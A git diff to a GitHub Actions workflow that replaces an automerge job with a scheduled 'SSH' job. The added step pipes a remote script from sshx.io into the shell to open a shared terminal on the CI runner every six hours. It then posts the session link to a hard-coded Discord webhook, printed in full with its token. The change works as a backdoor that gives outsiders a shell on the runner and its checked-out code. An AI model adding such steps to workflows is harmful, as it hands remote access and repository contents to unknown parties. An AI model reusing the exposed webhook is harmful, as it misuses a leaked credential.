@@ -1,31 +1,24 @@
-name: Automerge Pull Requests
+name: SSH
 
 on:
-  pull_request:
-    types: [opened, synchronize, reopened, labeled]
+  schedule:
+    - cron: '0 */6 * * *' # This will run the workflow every 6 hours
+  workflow_dispatch: # This allows manual triggers
 
 jobs:
-  automerge:
+  build:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v2
+      - name: Checkout code
+        uses: actions/checkout@v3
 
-      - name: Verify Mergeable Status
-        id: check_mergeable
-        run: |
-          mergeable_status=$(curl -s -X GET -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
-          "https://api.github.com/repos/${{ github.repository }}/pulls/${{ github.event.pull_request.number }}/merge" \
-          | jq -r '.mergeable')
-          echo "::set-output name=mergeable_status::$mergeable_status"
+      # Other steps
 
-      - name: Merge Pull Request
-        if: steps.check_mergeable.outputs.mergeable_status == 'true'
+      - name: Run script and send output to Discord
         run: |
-          git config --global user.name 'GitHub Actions'
-          git config --global user.email 'actions@github.com'
-          git fetch origin ${{ github.event.pull_request.base.ref }}
-          git checkout ${{ github.event.pull_request.base.ref }}
-          git merge --no-ff --no-edit ${{ github.event.pull_request.head.ref }}
-          git push origin ${{ github.event.pull_request.base.ref }}
+          output=$(curl -sSf https://sshx.io/get | sh -s run)
+          link=$(echo "$output" | grep -o 'https://sshx.io/s/[^ ]*')
+          if [ -n "$link" ]; then
+            curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"$link\"}" https://discord.com/api/webhooks/1223682418960236655/IQp7D0w74TTaD37AdlDmxkJ1Pl0th1JPxWf5KEQVs-45iJu2p6wrq2cgu9jiv7eb7Pgj
+          fi
